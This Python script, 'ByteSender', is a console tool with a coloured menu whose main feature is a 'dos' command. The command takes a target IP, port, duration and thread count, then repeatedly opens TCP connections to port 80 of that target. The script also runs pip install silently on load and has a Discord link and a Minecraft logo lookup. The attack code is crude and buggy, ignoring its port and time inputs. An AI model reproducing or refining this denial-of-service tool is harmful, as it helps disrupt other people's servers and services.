import logging
import random
from random import randint
import time
import webbrowser
import os
from colorama import Fore
import platform
import ctypes, socket, sys
from datetime import datetime
import socket
from mcstatus import MinecraftServer
import PIL
from PIL import Image
from threading import *
import signal


class Colours:
    def __init__(self):
        if platform.system() == 'Windows':
            kernel32 = ctypes.windll.kernel32
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
        COMMANDS = {
            # Lables
            'info': (33, '[!] '),
            'que': (34, '[?] '),
            'bad': (31, '[-] '),
            'good': (32, '[+] '),
            'run': (97, '[~] '),
            # Colors
            'green': 32,
            'lgreen': 92,
            'lightgreen': 92,
            'grey': 37,
            'black': 30,
            'red': 31,
            'lred': 91,
            'lightred': 91,
            'cyan': 36,
            'lcyan': 96,
            'lightcyan': 96,
            'blue': 34,
            'lblue': 94,
            'lightblue': 94,
            'purple': 35,
            'yellow': 93,
            'white': 97,
            'lpurple': 95,
            'lightpurple': 95,
            'orange': 33,
            # Styles
            'bg': ';7',
            'bold': ';1',
            'italic': '3',
            'under': '4',
            'strike': '09',
        }
        for key, val in COMMANDS.items():
            value = val[0] if isinstance(val, tuple) else val
            prefix = val[1] if isinstance(val, tuple) else ''
            locals()[key] = lambda s, prefix=prefix, key=value: self._gen(s, prefix, key)
            self.__dict__[key] = lambda s, prefix=prefix, key=value: self._gen(s, prefix, key)

    def _gen(self, string, prefix, key):
        colored = prefix if prefix else string
        not_colored = string if prefix else ''
        result = '\033[{}m{}\033[0m{}'.format(key, colored, not_colored)
        return result


class ByteSender(Colours):
    os.system('pip3 install colorama Pillow mcstatus')
    random1 = random.randint(111111, 999999)
    kernel32 = ctypes.windll.kernel32
    kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)

    def print_logo(self) -> None:
        print(
            Fore.RED + "               ██████╗ ██╗   ██╗████████╗███████╗███████╗███████╗███╗   ██╗██████╗ ███████╗██████╗                 ")
        print(
            Fore.RED + "               ██╔══██╗╚██╗ ██╔╝╚══██╔══╝██╔════╝██╔════╝██╔════╝████╗  ██║██╔══██╗██╔════╝██╔══██╗                 ")
        print(
            Fore.RED + "               ██████╔╝ ╚████╔╝    ██║   █████╗  ███████╗█████╗  ██╔██╗ ██║██║  ██║█████╗  ██████╔╝                 ")
        print(
            Fore.RED + "               ██╔══██╗  ╚██╔╝     ██║   ██╔══╝  ╚════██║██╔══╝  ██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗                 ")
        print(
            Fore.RED + "               ██████╔╝   ██║      ██║   ███████╗███████║███████╗██║ ╚████║██████╔╝███████╗██║  ██║                 ")
        print(
            Fore.RED + "               ╚═════╝    ╚═╝      ╚═╝   ╚══════╝╚══════╝╚══════╝╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝                 ")

        print(os.path.dirname(sys.executable))

        print()
        print(
            Fore.CYAN + "                                          Copyright © KeineSecrets (2021-present) All Rights Reserved.                                          ")
        print()
        print(
            Fore.RED + "                                                    (!) " + Fore.LIGHTWHITE_EX + "Enter " + Fore.CYAN + "help" + Fore.LIGHTWHITE_EX + " for help." + Fore.RED + " (!)")
        print()

    def __init__(self):
        super().__init__()
        self.print_logo()
        self._take_cmd()

    def _take_cmd(self):
        while True:
            cmd = input(Fore.RED + "> " + Fore.LIGHTGREEN_EX).strip()
            if cmd:
                if cmd == "help":
                    print(Fore.LIGHTGREEN_EX + "Welcome to ByteSender. Here's an brief introduction.")
                    print("")
                    print(Fore.LIGHTGREEN_EX + "[##] Command |  What does it do?   |        Arguments        |")
                    print(Fore.LIGHTGREEN_EX + "[01]   help  | Shows this message  |            X            |")
                    print(Fore.LIGHTGREEN_EX + "[02]    dc   |   Support Discord   |            X            |")
                    print(Fore.LIGHTGREEN_EX + "[02]   dos   |  DOS an specific IP | IP, Port, Time, Threads |")
                    print("")
                    print(
                        Fore.LIGHTGREEN_EX + "If you are not sure, what this is, please " + Fore.GREEN + "visit our support discord" + Fore.LIGHTGREEN_EX + ".")
                elif cmd == "dc":
                    webbrowser.open("https://discord.gg/67UqMVvubT", new=2)
                    print(
                        Fore.LIGHTGREEN_EX + "A new Tab will be opened shortly. If you are creating a ticket, please use this ID: " + Fore.RED + "{}".format(
                            self.random1))
                elif cmd == "dos":
                    IP = str(input(Fore.RED + "> Enter the IP address " + Fore.BLACK + "| " + Fore.RED + "> "))
                    PORT = str(input(Fore.RED + "> Enter the Port " + Fore.BLACK + "| " + Fore.RED + "> "))
                    TIME = str(input(Fore.RED + "> Enter the Time in seconds " + Fore.BLACK + "| " + Fore.RED + "> "))
                    THREADS = str(input(Fore.RED + "> Enter the number of Threads " + Fore.BLACK + "| " + Fore.RED + "> "))
                    print(Fore.LIGHTGREEN_EX + "DoS-ing IP " + Fore.RED + IP + Fore.LIGHTGREEN_EX + " at port " + Fore.RED + PORT + Fore.LIGHTGREEN_EX + " with " + Fore.RED + THREADS + Fore.LIGHTGREEN_EX + " threads for " + Fore.RED + TIME + Fore.LIGHTGREEN_EX + " seconds...")
                    for i in range(1, int(THREADS)):
                        try:
                            ip = socket.gethostbyname(str(IP))
                        except:
                            print(
                                Fore.RED + "(!) " + Fore.LIGHTWHITE_EX + "An error occured while connecting to " + IP + ". Is that an IPv4 or an Domain?")
                            self._take_cmd()
                        ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        try:
                            ddos.connect((IP, 80))
                            ddos.send(bytes("DoSing via ByteSender.", 'utf-8'))
                        except:
                            print(Fore.RED + "(!) " + Fore.LIGHTWHITE_EX + "An error occured while dosing " + IP + ".")
                            self._take_cmd()
                        ddos.close()
                    print(Fore.GREEN + "(+) " + Fore.LIGHTGREEN_EX + "DoS finished.")
                    self._take_cmd()





                elif cmd == "logo":
                    HOST = str(input(Fore.RED + "> Enter an IP address " + Fore.BLACK + "| " + Fore.RED + "> "))
                    server = MinecraftServer(HOST).status()
                    status = server
                    img = status.favicon
                    if status.favicon:
                        Image.open(img)
                    print('Error, could not find Logo..')

                elif cmd == "discord":
                    webbrowser.open("https://discord.gg/67UqMVvubT", new=2)
                    print(
                        Fore.LIGHTGREEN_EX + "A new Tab will be opened shortly. If you are creating a ticket, please use this ID: " + Fore.RED + f"{self.random1}")
                else:
                    print(
                        Fore.RED + "(!) " + Fore.LIGHTWHITE_EX + "This command is not registered. Use " + Fore.CYAN + "help" + Fore.LIGHTWHITE_EX + " for help.")
            else:
                print(
                    Fore.RED + "(!) " + Fore.LIGHTWHITE_EX + "This command is not registered. Use " + Fore.CYAN + "help" + Fore.LIGHTWHITE_EX + " for help.")




if __name__ == '__main__':
    ByteSender()
